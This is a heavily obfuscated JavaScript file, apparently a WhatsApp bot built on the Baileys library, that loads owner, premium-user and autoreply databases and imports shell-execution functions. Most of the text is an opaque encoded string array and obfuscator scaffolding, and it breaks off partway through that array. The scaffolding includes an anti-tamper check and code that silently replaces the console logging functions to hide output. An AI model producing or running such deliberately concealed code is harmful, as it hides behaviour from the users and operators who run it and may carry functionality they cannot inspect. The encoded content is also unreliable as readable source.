(function (_0x26dd9c, _0x3e69b5) {
  const _0x1dbbcf = _0x26dd9c();
  while (true) {
    try {
      const _0x4252f7 = parseInt(_0x4af7(2217, 0x2e3)) / 1 * (parseInt(_0x4af7(918, 0x58e)) / 2) + -parseInt(_0x4af7(1537, -0x4b)) / 3 * (parseInt(_0x4af7(1531, 0x8f6)) / 4) + parseInt(_0x4af7(2683, 0xb15)) / 5 + -parseInt(_0x4af7(1973, 0x43a)) / 6 * (-parseInt(_0x4af7(655, 0x57a)) / 7) + -parseInt(_0x4af7(1239, 0x243)) / 8 + parseInt(_0x4af7(2275, 0x2ab)) / 9 * (-parseInt(_0x4af7(924, 0x22b)) / 10) + -parseInt(_0x4af7(2553, 0xa96)) / 11 * (parseInt(_0x4af7(1939, 0xc1a)) / 12);
      if (_0x4252f7 === _0x3e69b5) {
        break;
      } else {
        _0x1dbbcf.push(_0x1dbbcf.shift());
      }
    } catch (_0x2f8cf2) {
      _0x1dbbcf.push(_0x1dbbcf.shift());
    }
  }
})(_0x4d4f, 802809);
const _0x444149 = function () {
  let _0x253979 = true;
  return function (_0x1c0226, _0x8874e9) {
    const _0x442ef8 = _0x253979 ? function () {
      if (_0x8874e9) {
        const _0x21adac = _0x8874e9.apply(_0x1c0226, arguments);
        _0x8874e9 = null;
        return _0x21adac;
      }
    } : function () {};
    _0x253979 = false;
    return _0x442ef8;
  };
}();
const _0xc9bfbe = _0x444149(this, function () {
  return _0xc9bfbe.toString().search("(((.+)+)+)+$").toString().constructor(_0xc9bfbe).search("(((.+)+)+)+$");
});
_0xc9bfbe();
const _0x175989 = function () {
  const _0x3d1dad = {
    'opXRZ': function (_0x143515, _0x1d1cd9) {
      return _0x143515 !== _0x1d1cd9;
    }
  };
  _0x3d1dad.bSAwq = "ZSbPK";
  let _0x7e7615 = true;
  return function (_0x5d5e64, _0x2fc412) {
    const _0xd7324d = {
      'MjuTA': function (_0x68de60, _0x48983b) {
        return _0x68de60 !== _0x48983b;
      },
      'Kjakf': _0x3d1dad.bSAwq
    };
    const _0x5b3762 = _0x7e7615 ? function () {
      if (_0xd7324d.Kjakf !== _0xd7324d.Kjakf) {} else {
        if (_0x2fc412) {
          const _0x56571c = _0x2fc412.apply(_0x5d5e64, arguments);
          _0x2fc412 = null;
          return _0x56571c;
        }
      }
    } : function () {};
    _0x7e7615 = false;
    return _0x5b3762;
  };
}();
const _0x55d0e2 = _0x175989(this, function () {
  const _0x4402a7 = function () {
    let _0x5d7066;
    try {
      _0x5d7066 = Function("return (function() {}.constructor(\"return this\")( ));")();
    } catch (_0x403257) {
      _0x5d7066 = window;
    }
    return _0x5d7066;
  };
  const _0x3082d4 = _0x4402a7();
  const _0x5e0dc1 = _0x3082d4.console = _0x3082d4.console || {};
  const _0x1d056b = ["log", 'warn', 'info', "error", 'exception', "table", "trace"];
  for (let _0x54ff40 = 0; _0x54ff40 < _0x1d056b.length; _0x54ff40++) {
    const _0x3bbc90 = _0x175989.constructor.prototype.bind(_0x175989);
    const _0x329292 = _0x1d056b[_0x54ff40];
    const _0x2c10c9 = _0x5e0dc1[_0x329292] || _0x3bbc90;
    _0x3bbc90.__proto__ = _0x175989.bind(_0x175989);
    _0x3bbc90.toString = _0x2c10c9.toString.bind(_0x2c10c9);
    _0x5e0dc1[_0x329292] = _0x3bbc90;
  }
});
_0x55d0e2();
const {
  default: makeWaSocket,
  useMultiFileAuthState,
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType
} = require("@whiskeysockets/baileys");
const os = require('os');
const fs = require('fs');
const fsx = require('fs-extra');
const util = require("util");
const chalk = require("chalk");
const moment = require("moment-timezone");
const speed = require("performance-now");
const axios = require('axios');
const {
  exec,
  spawn,
  execSync
} = require("child_process");
const {
  performance
} = require("perf_hooks");
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);
const {
  TelegraPh,
  UploadFileUgu,
  webp2mp4File,
  floNime
} = require("./lib/uploader");
const {
  toAudio,
  toPTT,
  toVideo,
  ffmpeg,
  addExifAvatar
} = require("./lib/converter");
const {
  smsg,
  getGroupAdmins,
  formatp,
  jam,
  formatDate,
  getTime,
  isUrl,
  await,
  sleep,
  clockString,
  msToDate,
  sort,
  toNumber,
  enumGetKey,
  runtime,
  fetchJson,
  getBuffer,
  json,
  delay,
  format,
  logic,
  generateProfilePicture,
  parseMention,
  getRandom,
  pickRandom,
  reSize
} = require("./lib/myfunc");
let afk = require("./lib/afk");
const {
  addPremiumUser,
  getPremiumExpired,
  getPremiumPosition,
  expiredCheck,
  checkPremiumUser,
  getAllPremiumUser
} = require("./lib/premiun");
const {
  fetchBuffer,
  buffergif
} = require("./lib/myfunc2");
function _0x1753a5(_0x57fe1e, _0x2db0de, _0x45a709, _0x4402a5) {
  return _0x4af7(_0x57fe1e + 0x26, _0x45a709);
}
let premium = JSON.parse(fs.readFileSync("./database/premium.json"));
let _owner = JSON.parse(fs.readFileSync("./database/owner.json"));
let owner = JSON.parse(fs.readFileSync("./database/owner.json"));
let _afk = JSON.parse(fs.readFileSync("./database/afk-user.json"));
let hit = JSON.parse(fs.readFileSync("./database/total-hit-user.json"));
const VoiceNoteXeon = JSON.parse(fs.readFileSync("./database/autoreply/vn.json"));
const StickerXeon = JSON.parse(fs.readFileSync("./database/autoreply/sticker.json"));
const ImageXeon = JSON.parse(fs.readFileSync("./database/autoreply/image.json"));
function _0x5c3069(_0x54ec97, _0xfdb218, _0x3e812c, _0x286cc6) {
  return _0x4af7(_0x286cc6 - 0x65, _0xfdb218);
}
const VideoXeon = JSON.parse(fs.readFileSync("./database/autoreply/video.json"));
const DocXeon = JSON.parse(fs.readFileSync("./database/autoreply/doc.json"));
const ZipXeon = JSON.parse(fs.readFileSync("./database/autoreply/zip.json"));
const ApkXeon = JSON.parse(fs.readFileSync("./database/autoreply/apk.json"));
const time2 = moment().tz("Asia/Kolkata").format("HH:mm:ss");
if (time2 < '23:59:00') {
  var xeonytimewisher = "Good Night 🌌";
}
function _0x4d4f() {
  const _0x524618 = ['ChjLBq', 'BgLZDgLTywDL', 'zxj0zxi', 'zv9WyxLTzw50xW', 'D09mwwO', 'DLndy3q', 'yNnQtwG', 'sLbJqLu', 'uwT5uwO', 'x3rYyw5ZCgfYzq', 'uKOMB2u9nJy2ra', 'wvjdC3m', 'yKP0zNq', 'Dg9IAw8GkLTVCa', 'yxrL', 'lIdINiu', 'BY9bDwrPBYb0Aa', 'y2HHBgS', 'BMPxEee', 'BWO+ihrVyxvKAq', 'utvbyuLnmfm1tW', 'C291BMqYmG', 'rgXYz3q', 'yLzXCvO', 'BhKGy2HHBMDLza', 'y29UDgvUDa', 'rg5sqLO', 'Dfnkq1u', 'C3rHCNqkpIbHDq', 'mebZlNDOyxrZyq', 'C291BMq5mG', 'Eg12DLq', 's3nTDxm', 'C1vmseS', 'AwjIlMnVl2TtCW', 'ifzPzgvVia', 'yw9PCMC', 'yK5kDwO', 'lI9SAwiVDxbSBW', 'tNDutw4', 'Cgf0Aa', 'zxH0nq', 'ig93BMvYiseH', 'C291BMqZnG', 'B3vWieLUDML0zq', 'C2vUzfrLEhq', '4Psi4P6Kiog0JEg0GmMQYBqG4Bsn4Bsh', 'zg91yMXLA2LSBa', 'y29UDgfJDhm', 'iUkCS++4J+g3JEc/HS2g4zY08j2xRCY68j2xMpcDL6FHT7NmMVcDL6BWNzEOZlu', 'BM90ihjLz2LZDa', 'CMrztvC', 'C291BMq2', 'BMuG8j+LUG', 'wLnIueS', 'v1HZBgi', 'Dg9PBwfNzq', 'uvLyuNm', 'pWOkrxHHBxbSzq', 'DKnfC0u', 'BwfNzw50yq', 'y2fZzq', 'ss9YyxCVBwfZDa', 'sNHryNm', 'uhncwuW', 'vfrXsuG', 'mwqWiIWIBMfTzq', 'zhffqvG', 'CMvWzwf0kduWma', 'ndm1iIWIChjVza', 'uhrwsKK', 'BgzyDMi', 'zgvSDMLKzw8', 'De1dAe4', 'u3LRvve', 'vuzKzwS', 'ieXPBMSG', 'z3jVDxbgzxrJAa', 's2DdvwO', 'y2Tqv2e', 'rwHny2q', 'CMv0DxjUicHMDq', 's3boB3K', 'BNrSEsbYzxrYAq', 'kcGOlISPkYKRkq', 'Cw5vq0S', 'C2v0ChbNyW', 'tfP6t3K', 'DLb3ufe', 'otK5mdaSiM9MzG', 'rhbYs2i', 'BMfWsKK', 'AMDwB28', 'ChrPB25DkGO+ia', 'rLnesve', 'iIWIyw1VDw50iG', 'C3vIDg90ywWIoG', 'ic8G', 'ChjLBwL1Bq', 'z3jVDxa', 'zvfoAfG', 'C2v0', 'ys9PBwfNzs8', 'zgvY', 'shP1v3O', 'vKDXquy', 'EgLZDhm', 'C291BMq5nG', 't1LumM00Bve1uW', 'zhn0AwnRzxikpG', 'C1r5EeO', 'DYbTzw1IzxjZia', 'AwXLl2mWmJaZnq', 'rgvSzxrLigP1BG', 'C291BMqXmG', 'mtCXntG4mta4na', 'thjxDu8', 'uLnqve0', 'ChjLlwTLEq', 'zhvYyxrPB24', 'y2LSCMy', 'BwvUDq', 'DhvrB2O', 'yML3DK0', 'Dw90uxu', 'uwTvtKi', 'ChjVzhvJDf9Ozq', 'idOG', 'ieXju1qQiooaJqRILii', 'qMLZA2y', 'mte6mda6mda', 'x3bHEq', 'EhD0s1i', 'D1nUBwW', 'y29TCg9ZAw5N', 'BK9VChy', 'reXXz2S', 'rwT4C1O', 'CgvUzgLUzYiSiG', 'C291BMqXmZm', 's25Pzgu', 'Eufzt1m', 'lI4UlG', 'zxH0zxjUywXbza', 'AfrgtfG', 'vKnetMC', 'wM1zCMq', 'FsWICxvHBNrPDa', 'vLPKq1u', 'A3n3u1e', 'r2L4qNa', 'ote2ota5mtm3mG', 'zsbPCYb2zxj5ia', 'Dgf0qw0', 'C291BMq4nq', 'rfDSseC', 'C291BMqYoq', 'Dci6EYj2ywX1zq', 'v0ntzwi', 'Ag9puxK', 'v0Dqz1a', 'l2LTywDLlMPZBW', 'zxiGBgLUAW', 'C291BMq3oa', 'zxjYB3i', 'mdKIlcjUyw1LiG', 'v1n2BxC', 'BMn0Aw9UkcKG', 'u2jtqMO', 'vgHLig51BwjLCG', 'C291BMqXntm', 'BNqIoNSIDMfSDq', 'cJ4GC3LZDgvTDq', 'Ahr0Chm6lY9LEa', 'C1zMsNO', '66A8ioQWGoYDTcbyzw9Uia', 'z3jVDxbtzxr0Aq', 'wNPrDM4', 'tMvcBvu', 'BgHMuKO', 'C291BMqXnJe', 'AgjqqvK', 'rMDzCuW', 'AguGr3jVDxaG8j+vIU+4JW', 'uvfzELq', 'pt09id4k', 'ignOyxqU', 'vKPLu0m', 'C3rPy2TLCLnLBG', 'DhLWzq', 'rMz4DNu', 'sejhDg4', 'kGOGcIaGicaGia', 'zgvSEMLW', 'BI92BMqUyw5KCG', 'suHrAee', 'ienSB3nPBMCGva', 'AxzNDLO', 'vxfKy08', 'sxjyAhi', 'cJ4GzgvTB3rLcG', 'C291BMq2mG', 'zeX1yMS', 'twf4Aw11BsaXma', 'cJWGpt09pt09pq', 'u3vJy2vZC2z1Ba', 'AgDHu3G', 'qKTXEvu', 'vuvIAxK', 'Afnmze0', 'mtaXmty', 'wvDJsg4', 'Dsb3yw50ihrVia', 'svzIEM8', 'ihn0AwnRzxjZlG', 'Dg90ywXTzw0', 'l3zPzgvVlMPZBW', 'vMLKzw8GtMfTzq', 'yxv0B2jPBW', 'r09fDfi', 'lI9SAwiVywzR', 'iJOIkZu1mZm5oq', 'ue9uwLy', 'ueDbB3y', 'zg9uDfq', 'vNHRzhG', 'C291BMq0', 'AMf4r3y', 'wKD4t2y', 'Du1htNq', 'DgHczem', 'ihPPCcbUyw1LpW', 'CMvZzxrSAw5R', 'y3rVCIGICMv0Dq', 'svj2uxa', 'mh0SiNjLzMvYzq', 'ieL0j3mGAg9SAq', 'mMmXltHLn2i0yG', 'wLrps2q', 'zMPqv2i', 'ELf2qvK', 'CMvKqNjPz2H0', 'z2vZ', 'vKX6Exu', 'u3vRCuy', 'DhjPBq', 'z3jVDxbSAw5R', 'zufxrLe', 'zgvSyxbR', 'BfjRv0m', 'vLzvyxK', 'ywzRcGOQuMvHCW', 'r0TMzKy', 'ruX0CwG', 'lcjWCM9KDwn0xW', 'qunkvfO', 'ChaUBMv0', 'BvbAANC', 'twvNBM8', 'C291BMq5mW', 'ltq4n2uTotjJmq', 'DMLLD09Uy2u', 'tg1iugW', 'cKv4oIaU', '4Psm4Psa4Psa4Q2t44cmicPbueS', 'y2fWDgLVBIa', 'vMTeDu4', 'z1fIsLe', 'ruTyv1y', 'vhvIzqPPDgvTmW', 'C3nPB24kpIbQBW', 'twr6teS', 'CMvTB3rLsMLK', 'C2v0zgvZAW', 'BKTRBuS', '7j20ifHLB24IlcjH', 'uuPmD2e', 'DM9RzqO+igXPCW', 'x2LKiJOInZuZoa', 'AMfT', 'if9tzwnVBMrFia', 'zxrJyxnLcJ4Gyq', 'rw50zxiGDgHLia', 'DMfSDwuIoJq1na', 'CMTzr20', 'ufrXExm', '8j2zVpcDMB/WNzM78j2zTpcDMOpWNzM08j2zSYdWN6AelG', 'v1PdChi', 'A0Tdzgi', 'zMXVB3i', 'BgLUA2DJ', 'Cfr2EMW', 'BgLUA2DYDxa', 'rxHWAxjLzca6ia', 'vxnLia', 'nZG4lcjVzMzZzq', 'twvTB3j5ifvZyq', 'y29UDgv4DeLUzG', 'Cg5eqw0', 'yuPQwgC', 'qwHnzfu', 'DeLUDML0zq', 'tLPqB0S', 'zxrZzxnZAw9UcG', 'BM93', 'DKXNv2q', 'ie9Wzw5PBMCGva', 'CMWkpIb0B3fYcG', 'C21LBwu', 'qLDWv28', 'EwXuz08', 'r3PgqKm', 'u2XgqxC', 'ExrTCdq', 'yxr0CNm', 'qvbZr3a', 'zvj5EMK', 'B09jzLK', 'seG6Bw06C3m', 'y0XfqKe', 'zhr5CcaQw29WDa', 'sLHbC20', 'uNjmr20', 'z3jVDxbqyxj0Aq', 'iMTLEsi6iIS5mq', 'DhzlBLG', 'qMjcsg0', 'qM9KEq', 'u01Hv0e', 'A0DpzLy', 'kIdINiukcLbHDxnL', 'C3rPy2TLCG', 'sLb1se0', 'y3jOCuS', 'wwfSqMi', 'C291BMqXmdq', 'igj1z3mSihbSzq', 'C291BMqXma', 'DvvhDeW', 'u05VCwO', 'oIOk', 'vgHLig5HBwuGBW', 'Dg91CMW', 'igf1Dg8TDhLWAq', 'ys90AhvTyI5QCa', 'uLHvwwe', 'CMvHzgrPCG', 'D3HbwhO', 'z2v0C2vZC2LVBG', 'iJOIiIWIyw1VDq', 'lI9ZzxnZAw9UlW', 'BLznBKy', 'EMLWigjHy2T1Ca', 'ChbtC1i', 'zgrWCMvTkIbUDq', 'DvrxA20', 'iMH0DhbZoI8VDW', 'C291BMqZoq', 'u2vUzc9szxbSEq', 'u3v5u2G', 'C291BMqXmdG', 'zc1JngrKltrHyq', 'Bxr5Cgu', 'EgLZDcbPBIb0Aa', 'DwX2ru0', 'A2LJAWO+igfKza', 'r0D4ruq', 'C291BMqZnW', 'ru9zyLG', 'BwfW', 's0jrEK8', 'vvDAq3i', 'zg9Uzq', 'EuDevNK', 'Aw9U', 'wuHPtg0', 'zxH0zw5Kzwruzq', 'mtq0', 'A2vYCY8', 'tuDzwxu', 'BguQcJeWihnLyW', 'yxq6', 'CgzKB0K', 'sMXOBum', 'twTiAgm', 'DMnVsfi', 'yMXVy2S', 'DgvqAMu', 'Dg8G', 'yxqUD2HHDhnHCa', 'EwHUqwq', 'ueq0l2DLDfn0Aq', 'CM9cCfy', 'C2vZC2LVBI0', 'zg5wrMK', 'vwHXr00', 'mJu2', 'q21wtvK', 'twz6DuS', 'uhr0rhC', 'AuHeDvG', 'BxaZ', 'lM9YzY9MAwXLlW', 'CMv0ywLSzxjFAq', 'we1XC0W', 'r0PZDwy', 'C3LZ', 'C3LZDwKkpIb4Ca', 'ww9oDe0', 'cML0zw0XlLrfta', 'ote6qufiv0iXza', 'odqYnJC0nJa1nW', 'zhKGsw4GvxnL', 'C3vJy2vZCW', 'zxH0cJ4Gzw1VAG', 'tMPywNe', 'CLLzrNG', 'sw1Hz2uGtMfTzq', 'DxrPBa', 'cKv4yw1WBguGoG', 'iseH', 'BufrBwS', 'AKjnAgS', 'vg8GvMLLDYbuEq', 'BwvZC2fNzvrPBq', 'yxb0Aw9UicO', '6Rca7j20ifHLB24G8j+MHoUtNa', 'l3n0AwnRzxiUAG', 'AxnJB3vUDci6EW', 'BMqGysbSyxjNzq', 'cVcFKAqGkKDYB3vWia', 'AxnhCM91Ca', 'y3b1CW', 'ruT1yxe', 'C2v0iJOXmdb9la', 'svHYtNa', 'qujouem', 'quPSCfC', 'CMvJB3jKAw5N', 'Aw4kpIbZAhv0za', 'u1HRq00', 'qNvMthC', '4BsBiog0JEg0H8M04BsCcJ4GCW', 'C291CMnLvxjS', 'v1fXrLq', 'ihLVDsbKB25HDa', 'cKzooG', 'zMLSDgvY', 'Cgu9su5urvjorq', 'BNq9ChjVywn0Aq', 'ywrKEMLW', 'u01WtMi', 'AwWTAw1Hz2uToa', 'ig9Ul29MzG', 'DKjUvue', 'YBtHTixkGog0J8MQ4BsfcJ4GEa', 's2HzsgS', 'wLjdA1O', 'C291BMqXntK', 'uvnhsuS', 'C291BMqXnda', 'Ahr0Chm6lY9JAa', 'Ahr0Chm6lY9HCa', 'swvcz2G', 'cGOkcGOkcGOkcG', 'Aur5B0q', 'DxbKyxrLqMXVyW', 'tMvPsxa', 'C3zvAgO', 't2TeC3m', 'CMnOx25LD19JAa', 'AwrSzq', 'zxH0mW', 'DgfNCW', 'tu1Mrvm', 'y2rkq3G', 'BhKGzgvSzxrLza', 'uxvHBgL0EtOQia', 'zw50lcbJDxjYzq', 'C291BMq4nG', 'ngWVuu9XkZLQta', 'C2vJB25KCW', 'sxPZsLC', '4PAi4PAi4PAi4PAi44clmtaWjq', 'ihrOzsbIB3qGBW', 'yMvdDwC', 'CgLUBW', 'zu5PExC', 'cIRIGki+iezSAxaG', 'D2f0y2HgAwXL', 'lNbUzW', 'nti5nZu4zc1Jna', 'zw9UEq', 'uej1C0W', 'sfzSqLy', 'B0HmEwq', 'YPNHTjZjOIdjOSQa4Bsp4BsC4Bsyia', 'C3P5s2K', 'vfnZtvC', 'C291BMq3na', 'Ahr2AMq', 'sw4GChjVy2vZCW', 'C291BMq3mW', 'yxv0B3n0yxr1CW', 'AMnqAeu', 'C3rHDhvZqgjYBW', 'ywX1zsi6otK5oq', 's21sueW', 'Dg9VBMnL', 'lI9yzw9UtwvKAq', 'q21JExe', 'swLJv3y', 'Dg92Awv3B25Jzq', 'Bwu9', 'DuHHt3C', 'zsbcB3qGqNKG', 'y2vTzw50', 'AwrLBWO+igfKza', 's0XUuMS', 'zqO+ihrVDMLKzq', 'yxnLBLu', 'ChnJDKG', 'qND6CKC', 'ueHpve8', 'rKziDeq', 'uMHQqu0', 'rNzZzhu', 'y0TPC2O', 'BgLUAW', 'CMvHzezPBgvtEq', 'EvHXBNG', 'zGPuBYbJAgvJAW', 'Axn0CW', 'yxrhDLa', 's09WyMm', 'z3rWrfC', 'C291BMqXmJi', 'zxjuAhvTyM5HAq', 'y29TiN0', 'ywrKB3DUzxi', 'ugvlEhu', 'DefmrgK', 'Dg90ywW', 'C2nOzwr1BgvKqW', 'ztLJmZbMn2i2za', 'C291BMq2na', 'ihnVihrOyxqGDa', 'txrYD1y', 'tK95CgS', 'y2XKAxe', 'rg1ht0e', 'cLrVienOzwnRia', 'BgfWAWO+igrLBa', 'q0Hbvf9trvrusq', 'wLb2uKe', 'C2vnzxnZywDL', 'Ce9AsgS', '4Oc6icaGicaGicaG', 'BxKGAgfUzhnVBq', 'q0vuALi', 'ELvTExO', 'DuDnC0m', 'iJOXndGWntu4ma', 'qhrHzYaZmgq', 'vgL0DgXLoIOG', 'Eunmy0q', 'EejJshy', 'EKjovLu', 'BgLLzNq', 'y2TLCLnLDd9Uyq', 'nty3odKWywjJza', 'CgXHEq', 'AMHMuLO', 'z2LMzwuUD2vICa', 'C2vJB25KcM1PBG', 'z2HrEuG', 'C2vUzgvY', 'iNjLDgfPBgvYxW', 'sw50zxjHy3rPDG', 'Eu9Hq0m', 'uvvXDee', 'yMPlr3y', 'u3rPy2TLCLrVia', 'yMX1zujYAwDODa', 'ruPVv1e', 'ENbSEwm', 'vhH0rLq', 'CLHcD0S', 'vhbtvNO', 'wYbnrvntquDfia', 'BwvKAwfuExbL', 'y2f0y2G', 'yMXHy2S', 'CNbSuM0', 'yNv0Dg9UugfYyq', 'BKLOvgy', 'CLHhAxy', 'Dwjzv0G', 'A2LSBaOk4PwW4Psi4P6Kia', 'qNKGt3DUzxi', 'CNnPB24', 'B2PgyLu', 'AxrPBMzVcJ4GBa', 'DgLVBL0QcJ4Gyq', 'zYb0Aw1LcIOJyq', 'mhW1Fdy', 'otH6CLvQzue', 'CMTRBfa', 'zNnoueW', 'mty3otK1otq4nG', 'CNvUDgLTzq', 'Bw9KzwW', 'ChPMzfi', 'Dg92AwrLBW', 'AgfYAq', 'ueq0l2DLDezPBa', 'C2v0C3vIAMvJDa', 'u1birKi', 'zsbZDgLJA2vY', 'vvvPwKi', 'Aw5RidOQigH0Da', 'tMjktum', 'AK9zs2S', 'r29Vzgj5zFcFLPa', 'C291BMq2ma', 'qKrZrfm', 'igfSBcb0AguGDa', 'B2zM', 'uLrhtM0', 'A1HfwM4', 'C3rYAw5NAwz5', 'C291BMqYmW', 'CgfJA25HBwu', 'ENngqLa', 'BgLZDhPPCa', 'wgTbq2S', 'CMrPBMCGyw5Kia', 'q3zRyMy', 'lsaQ', 'mtaWFsWICxvHBG', 'uKzduKu', 'z3jVDxbjBNzPDa', 'lNbKzG', 'r2H4B2e', 't3n6rwW', 'DgvZDa', 'DNH6rNy', 'q3LfDg8', 'C3HPCM4', 'Dg9TCdq', 'uLnUCgy', 'yNv0Dg9UC1jLCW', 'CevLsuC', 'AwDOjM1LzgLHxW', 'qMT5q0W', 'BxmIoLT7iM5HBq', 'AvfSqvu', 'DMLLD09Uy2vnzq', 'C2HVD0fKqxr0CG', 'vM9WtMe', 'EhbHEw1LBNq', 'swLQDvy', 'D25UDKC', 'ywrLCL9PBMzVxW', 'wgXPyxe', 'C0veDuy', 'DgvTCgXHDgvcDq', 'pt4Gsw4', 'r3jLEuy', 'uhvOr1y', 'Dg9gAxHLza', 'BYbJAgvJAYb0Eq', 'zvPoDgy', 'tfHNwwK', 'B2DPzGO+ihrVDq', 'ys9KB2mV', 'Chr0', 't09UCfm', 'y2nLC3m', 'wuHNB1m', 'C2v1q28', 'EhnHBxn1BMC', 'C3DpAeq', '4lQU4OkU4l2E4lIOvUQzSoc4QcdGUzBGUQe', 'u2vUDca', 'zxLZ', 'DcbtDgLJA2vYkG', 'B3b0Aw9UxsOkpG', 't3DxsMe', 'ywLS', 'BeH1qLG', 'yMfJA3vW', 'D2fvCgXVywruBW', 'y2XdCeG', 'Aw9UxsOkpIbHDq', 'DNPgsw4', 'D2fPDa', 'CgfYDgLJAxbHBG', 'Cw1Pz3m', 'BhKGqwrKAw5Nia', 'BenYs3y', 'y3rYzxbSEwDJEa', 'vKTkuNa', 'vgHPCYbUyw1Lia', 'Dw9WEfC', 'C291BMqYnG', 'AwzkqZbyyLH2mW', 'DxnPyY8', 'yMzPDLC', 'u2DTrKe', 'zLb2se0', 'ywrTAw4', 'tgLUAYbjBNzHBa', 'Acbdyxb0Aw9Uia', 'DhLWAw5NihrVia', 'zg9LCYbUB3qGzq', 'uujgq0C', 'quPLrNy', 'ignHChrPB24G', 'igLZig9UifLVDq', 'C2v0zgvZyW', 'y1HhDvi', 'igf1Dg8GCMvJBW', 'thPABvG', 'y2SGvhLWzsa', 'sePAt1C', 'BwvZC2fNzuLK', 'y2zfz2m', 'zvbUzhq', 'zgvTB3rL', 'DuTtCgy', 'uKjsyxi', 'ltK4mI5QCgC', 'wKzxtwq', 'vu1TC2O', 'ys9HDwrPBY8', 'v3vIs3O', 'lI82os94lNDLyG', 'AwXzwwi', 'B24G8j+MHoUtNoUMVcdQSidSNBqG', 'mdaSiM9MzNnLDa', 'rxHHBxbSzsa', 'DxLXAMq', 'ugjJqKjQuKOMBW', 'wgXrB20', 'z05nu0y', 'ywrKChjLBq', 'q0PABLC', 'l3zUlMPZB24', 'veL5sNC', 'mtu5mJKYnJaWoq', 'BxbSyxrL', 'B2nOweW', 'BNPiBwu', 'D25HEe4', 'CM5LzcbMCM9Tia', 'B09wufG', 'u1z1vNG', 'wLHws08', 'r1DRExK', 'su5lieLorK8QcG', 'qvPevMm', 'u2vYDMvY', 'Dxjose4', 'zNjVBq', 'EYj2ywX1zsi6na', 'cUkuGGO', 'C291BMq2nW', 'ifnLy29UzaO', 'y1DyBMG', 'Chzsyw8', 'v1vdqNm', 'ywrTAw4Gy2fUia', 'BIbxAgf0C0fWCa', 'qKL3CeK', 'tMPPtK4', 'EK96zvC', 'C2Hrr0S', 'qwL1zuS', 'ANLhA3i', 'Be1PuKi', 'zgvSDM4', 'CMfUzg9T', 'uuT0Afe', 'CL90ExbLiJOItW', 'uerKEgS', 'ihPPCca', 'DxjLigLZigzVCG', 'DfvhsM0', 'Dw50iJP7iNzHBa', 'u29JA2v0ignVBG', 'cLzPzgvVier1CG', 'ig51BwjLCGPfEa', '4Psa4Psa4Psa4Psa4Psa4Q2tcGOQva', 'Aw1Hz2uVBNvSBa', 'zvvbsui', 'rM5jrwW', 'q05ny3m', 'rLHqBu8', 'ieLTywDLifDPDa', 'BIdWN6Ae65oC66A8ioQWGoYDTcby', 'BMDvCgrHDgu', 'y2fSBfr5Cgu', 'ig9YihrLEhqH', 'BM1tyKq', 'uKHpq08', 'l20YmZmVDxaTBW', 'wg1hz1q', 'yw1WBguUy29TlW', 'CYbVCgvUzwqGyG', 'D2vdvNK', 'lM1Ll2fKzhn0Aq', 'zuLUDML0zq', 'Aw1Hz2uVD2vICa', 'yxvKAw9nzxnZyq', 'yxjL', 'CwT3ExK', 'ExzguwC', 'yNHrC04', 'DK15why', 'AufbEu0', 'yw5KCM9PzcakpG', 'C291BMq4oq', 'zYbuBYba', 'rM5Tyxm', 'AgLKzxrHzW', 'AvnhB0W', 'ifjLC2v0lcbhCG', 'CY9wAwrLB3mGvW', 'A3zIzxu', 'y29YzgLUzYaQwW', 'sKTQEfq', 'CNqTmJmTmtaTmq', 'CMrPBMCGDg8G', 'C291BMqXoq', 'yxrPB24Gms05ia', 'zNjVBunOyxjdBW', 'AhLKCMf0zwruzq', 'vK1OyLi', 'u0fKreu', 'zejvvMK', 'zxrHAwXLCL9Pza', 'DxrLcMHVDxikza', 'l2fWAY5QC29U', 'ndy1zJmXyY00zG', 'rgv0zwn0zwqG', 'C291BMqXmtC', 'AM9PBIb0AguGrW', 'uMnuC3m', 'rMjRAMO', 's0DVtgC', 'C291BMq5ma', 'CgXLyxnLihDHAq', 'tsdJGi0Tls0Tls0Q', 'EgLVCW', 'ifbSzwfZzsbPBG', 'DaPfEgfTCgXLia', 'BsbZDgLJA2vYia', 'BMT4wu4', 'BxnkC29U', 'A0XQqKy', 'CgH5C2LJywWTzW', 't3Pqwxm', 'DMLKzw8', 'meLIsdjoAKTzvq', 'yw5UB3vUy2vTzq', 'zw9UipcFPOtRK5ZRPRWG6Rca7j20', 'rfnlvwK', 'vfPdBwC', 'ndK4mZq2ENDezgnd', 'wuPtqwm', 'vCY4sCY4iepmUflQMBdmUehQMBdmUfpQMBdmUa', '4OcIiea', 'v2HHDcDZihrOzq', 'tM5gzfO', 'ntbTDLv0uMy', 'rMfQvfe', 'kKrptKxINiuGqLvh', 'BNfYze4', 'Awq9mdaWmdaWjG', 'ywT5BLa', 'vefuuxK', 'BgLZDhbYzw0', 'zwyXmJm0nty3oa', 'ioQWGoYDTcbyzw9U', 'rxHHBxbSzsa6ia', 'ieHHCYbczwnVBq', 'BMCG8j+mGW', 'zengDu4', 'zfjxEey', 'Dgv4De1LC3nHzW', 'uNnTBuG', 'vgLmANu', 'uhLjweO', 'oLjLz2LVBGPftG', 'BgLKiefUzcbszq', 'sMj5Cgy', 'mI5ftufjtdT0Eq', 'yxrPy19JB2rLiG', 'cJ4GBgLZDgfWAW', 'B25xAgf0C0fWCa', 'vvD4quG', 'vertzuS', 'vMvbzNC', 'yw1VDw50iJP7iG', 'igH0DhbZoI8VEq', 'C291BMqXmJC', 'uxbPru0', 't0nLtMO', 'B21XuhK', 'ywTPuxu', 'wdngrKOIlcj0Eq', 'zvf3t2K', 'CMv2B2TL', 'kgfZEw5JicGPia', 'Dxzbtu4', 'zJe2zgu4iIWIBG', 'r3jVDxaGq2HHDa', 'B1LHEhe', 'DLDLs3i', 'Dw5JyxvNAhrfEa', 'lI9KyxrHyMfZzq', 'vxnLidOkkInKzq', 'C2vUzfbYzxnLBG', 'tNvTyMvYig9Mia', 'vuz1qwe', 'ywv4EeK', 'A0Pisue', 'tNzAwLO', 'v250zKe', 'yxnO', 'BMfTzsbVzIb0Aa', 'ywrLCG', 'CgvUDgLTzqO+ia', 'Bxnus0y', 'ox0SEYjYzxrHAq', 'r0DUzLy', 'uxLwthG', 'igj1zYbPCYbPBG', 'C3bSAwnL', 'iJOIsu5siIWICa', 'D2fUDcb0BYbZzq', 'icPBB3b0Aw9Uxq', 'zgf0zq', 'yMLSr3e', 'lI9Zzxr0Aw5NCW', 'EMXTDxK', 'ExDOrhG', '44ckiokwIokwKUkwKUkwKUkwKUkwKUkwKUkwKG', 'zxHvDeK', 'BeH2tMu', 